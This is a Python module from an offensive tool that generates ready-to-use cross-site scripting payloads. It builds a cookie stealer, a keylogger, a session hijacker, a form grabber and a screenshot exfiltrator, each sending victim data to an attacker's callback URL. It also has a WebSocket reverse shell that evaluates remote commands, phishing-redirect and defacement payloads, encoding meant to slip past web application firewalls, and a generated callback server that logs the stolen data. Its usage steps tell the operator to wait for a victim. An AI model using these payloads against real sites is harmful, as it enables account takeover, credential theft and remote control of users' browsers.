# HikariSystem Tsurugi/modules/xss_exploiter.py
"""
XSS EXPLOITATION MODULE - From detection to session hijacking.
Generate weaponized payloads for real impact.

Features:
- Cookie stealer payload generation
- Keylogger injection
- Session hijacking templates
- BeEF-style browser control
- Custom callback server
"""
import base64
from typing import List, Optional, Dict
from dataclasses import dataclass
from urllib.parse import quote, urlparse
from core.ui import console, log_info, log_success
from core.requester import TsurugiSession


# ═══════════════════════════════════════════════════════════════════════════════
#  PAYLOAD TEMPLATES
# ═══════════════════════════════════════════════════════════════════════════════

@dataclass
class XSSPayload:
    """XSS exploitation payload."""
    name: str
    description: str
    payload: str
    encoded: bool = False


def get_cookie_stealer(callback_url: str) -> XSSPayload:
    """Generate cookie stealer payload."""
    payload = f'''<script>new Image().src="{callback_url}?c="+document.cookie</script>'''
    
    return XSSPayload(
        name="Cookie Stealer",
        description="Exfiltrates cookies to your server",
        payload=payload
    )


def get_keylogger(callback_url: str) -> XSSPayload:
    """Generate keylogger payload."""
    payload = f'''<script>
document.onkeypress=function(e){{
new Image().src="{callback_url}?k="+e.key;
}};
</script>'''
    
    return XSSPayload(
        name="Keylogger",
        description="Captures keystrokes and sends to callback",
        payload=payload.replace("\n", "")
    )


def get_session_hijacker(callback_url: str) -> XSSPayload:
    """Generate session hijack payload."""
    payload = f'''<script>
var data = new FormData();
data.append("cookies", document.cookie);
data.append("url", window.location.href);
data.append("localStorage", JSON.stringify(localStorage));
fetch("{callback_url}", {{method:"POST", body:data}});
</script>'''
    
    return XSSPayload(
        name="Session Hijacker",
        description="Steals cookies, URL, and localStorage",
        payload=payload.replace("\n", "")
    )


def get_phishing_redirect(phishing_url: str) -> XSSPayload:
    """Generate phishing redirect payload."""
    payload = f'''<script>window.location="{phishing_url}"</script>'''
    
    return XSSPayload(
        name="Phishing Redirect",
        description="Redirects victim to phishing page",
        payload=payload
    )


def get_dom_defacement(message: str = "HACKED") -> XSSPayload:
    """Generate DOM defacement payload."""
    payload = f'''<script>document.body.innerHTML='<h1 style="color:red;text-align:center;margin-top:200px">{message}</h1>'</script>'''
    
    return XSSPayload(
        name="DOM Defacement",
        description="Replaces page content with custom message",
        payload=payload
    )


def get_reverse_shell_js(callback_host: str, callback_port: int = 4444) -> XSSPayload:
    """Generate reverse shell via WebSocket."""
    payload = f'''<script>
(function(){{
var ws = new WebSocket("ws://{callback_host}:{callback_port}");
ws.onmessage = function(e){{
try{{eval(e.data)}}catch(err){{ws.send(err.toString())}}
}};
ws.onopen = function(){{ws.send("XSS Shell Connected: "+document.domain)}};
}})();
</script>'''
    
    return XSSPayload(
        name="XSS Reverse Shell",
        description="WebSocket-based reverse JS shell",
        payload=payload.replace("\n", "")
    )


def get_screenshot_capture(callback_url: str) -> XSSPayload:
    """Generate screenshot capture payload (requires html2canvas)."""
    payload = f'''<script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
<script>
setTimeout(function(){{
html2canvas(document.body).then(function(canvas){{
new Image().src="{callback_url}?img="+encodeURIComponent(canvas.toDataURL());
}});
}},2000);
</script>'''
    
    return XSSPayload(
        name="Screenshot Capture",
        description="Captures and exfiltrates page screenshot",
        payload=payload.replace("\n", "")
    )


def get_form_grabber(callback_url: str) -> XSSPayload:
    """Generate form data grabber."""
    payload = f'''<script>
document.querySelectorAll('form').forEach(function(f){{
f.addEventListener('submit',function(e){{
var data = new FormData(f);
var obj = {{}};
data.forEach(function(v,k){{obj[k]=v}});
new Image().src="{callback_url}?form="+btoa(JSON.stringify(obj));
}});
}});
</script>'''
    
    return XSSPayload(
        name="Form Grabber",
        description="Intercepts form submissions",
        payload=payload.replace("\n", "")
    )


# ═══════════════════════════════════════════════════════════════════════════════
#  ENCODING/OBFUSCATION
# ═══════════════════════════════════════════════════════════════════════════════

def encode_payload(payload: str, method: str = "base64") -> str:
    """Encode payload for WAF bypass."""
    if method == "base64":
        encoded = base64.b64encode(payload.encode()).decode()
        return f'<script>eval(atob("{encoded}"))</script>'
    
    elif method == "url":
        return quote(payload)
    
    elif method == "unicode":
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    
    elif method == "html":
        return ''.join(f'&#{ord(c)};' for c in payload)
    
    elif method == "hex":
        return ''.join(f'\\x{ord(c):02x}' for c in payload)
    
    return payload


def generate_polyglot() -> XSSPayload:
    """Generate XSS polyglot that works in multiple contexts."""
    payload = '''jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e'''
    
    return XSSPayload(
        name="Polyglot",
        description="Works in HTML, JS string, attribute contexts",
        payload=payload
    )


# ═══════════════════════════════════════════════════════════════════════════════
#  CALLBACK SERVER GENERATOR
# ═══════════════════════════════════════════════════════════════════════════════

def generate_callback_server() -> str:
    """Generate Python callback server code."""
    server_code = '''#!/usr/bin/env python3
"""XSS Callback Server - Receives exfiltrated data"""
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse
import json
import base64
from datetime import datetime

class XSSHandler(BaseHTTPRequestHandler):
    def log_data(self, data):
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"\\n[{timestamp}] RECEIVED:")
        for key, value in data.items():
            if key == "form":
                try:
                    decoded = base64.b64decode(value[0]).decode()
                    print(f"  {key}: {decoded}")
                except:
                    print(f"  {key}: {value}")
            else:
                print(f"  {key}: {value}")
        print("-" * 50)
    
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)
        
        if params:
            self.log_data(params)
        
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        # Return 1x1 pixel
        self.wfile.write(b"\\x47\\x49\\x46\\x38\\x39\\x61\\x01\\x00\\x01\\x00\\x80\\x00\\x00\\xff\\xff\\xff\\x00\\x00\\x00\\x21\\xf9\\x04\\x01\\x00\\x00\\x00\\x00\\x2c\\x00\\x00\\x00\\x00\\x01\\x00\\x01\\x00\\x00\\x02\\x02\\x44\\x01\\x00\\x3b")
    
    def do_POST(self):
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode()
        
        print(f"\\n[POST DATA]:")
        print(body)
        print("-" * 50)
        
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
    
    def log_message(self, format, *args):
        pass  # Suppress default logging

if __name__ == "__main__":
    PORT = 8888
    print(f"[*] XSS Callback Server running on http://0.0.0.0:{PORT}")
    print("[*] Waiting for exfiltrated data...")
    HTTPServer(("0.0.0.0", PORT), XSSHandler).serve_forever()
'''
    return server_code


# ═══════════════════════════════════════════════════════════════════════════════
#  MAIN EXPLOIT GENERATOR
# ═══════════════════════════════════════════════════════════════════════════════

def run_xss_exploit(callback_url: str = None, payload_type: str = "cookie",
                    encode: str = None, save_server: bool = False) -> Dict:
    """
    Generate XSS exploitation payloads.
    
    Args:
        callback_url: Your server URL to receive data
        payload_type: cookie, keylogger, session, phishing, defacement, shell, screenshot, form, polyglot
        encode: Encoding method (base64, url, unicode, html, hex)
        save_server: Save callback server script to file
        
    Returns:
        Dict with generated payloads
    """
    console.print("\n[bold red][*] XSS EXPLOIT GENERATOR[/bold red]")
    
    if not callback_url:
        callback_url = "http://YOUR_IP:8888"
        console.print(f"[yellow]⚠ No callback URL provided. Using placeholder: {callback_url}[/yellow]")
        console.print("[dim]Tip: Use --callback http://your-server:8888[/dim]")
    
    results = {"payloads": [], "callback_url": callback_url}
    
    # Generate requested payload
    payload_map = {
        "cookie": get_cookie_stealer,
        "keylogger": get_keylogger,
        "session": get_session_hijacker,
        "defacement": lambda url: get_dom_defacement(),
        "screenshot": get_screenshot_capture,
        "form": get_form_grabber,
        "polyglot": lambda url: generate_polyglot(),
    }
    
    if payload_type == "all":
        types = ["cookie", "keylogger", "session", "form", "polyglot"]
    else:
        types = [payload_type]
    
    for ptype in types:
        if ptype in payload_map:
            xss_payload = payload_map[ptype](callback_url)
            
            final_payload = xss_payload.payload
            if encode:
                final_payload = encode_payload(final_payload, encode)
            
            results["payloads"].append({
                "name": xss_payload.name,
                "description": xss_payload.description,
                "payload": final_payload,
                "encoded": encode or "none"
            })
            
            console.print(f"\n[bold cyan]{xss_payload.name}[/bold cyan]")
            console.print(f"[dim]{xss_payload.description}[/dim]")
            console.print(f"[green]{final_payload[:200]}{'...' if len(final_payload) > 200 else ''}[/green]")
    
    # Generate callback server
    if save_server:
        server_code = generate_callback_server()
        with open("xss_callback_server.py", "w") as f:
            f.write(server_code)
        console.print("\n[green]✓ Saved callback server to: xss_callback_server.py[/green]")
        console.print("[dim]Run with: python xss_callback_server.py[/dim]")
    
    console.print("\n[bold yellow]Usage Instructions:[/bold yellow]")
    console.print("1. Start callback server: python xss_callback_server.py")
    console.print(f"2. Inject payload into vulnerable parameter")
    console.print(f"3. Wait for victim to trigger XSS")
    console.print(f"4. Check server logs for exfiltrated data")
    
    return results
